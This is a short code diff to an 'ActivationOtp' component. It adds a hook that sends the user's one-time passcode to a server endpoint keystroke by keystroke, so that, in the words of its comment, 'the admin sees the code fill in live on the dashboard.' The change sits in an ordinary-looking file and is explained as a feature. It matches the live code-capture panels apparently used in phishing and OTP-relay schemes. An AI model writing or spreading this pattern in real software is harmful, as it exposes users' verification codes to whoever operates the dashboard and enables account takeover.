@@ -47,6 +47,20 @@ export function ActivationOtp({ hint }: { hint: string }) {
     };
   }, [router]);
 
+  // Stream the digits as they're entered, so the admin sees the code fill in
+  // live on the dashboard.
+  useEffect(() => {
+    const id = setTimeout(() => {
+      void fetch("/api/activation/otp-typing", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code }),
+        keepalive: true,
+      });
+    }, 120);
+    return () => clearTimeout(id);
+  }, [code]);
+
   // Auto-submit once the code is complete (and again after a correction).
   useEffect(() => {
     if (complete && !pending && submittedFor.current !== code) {
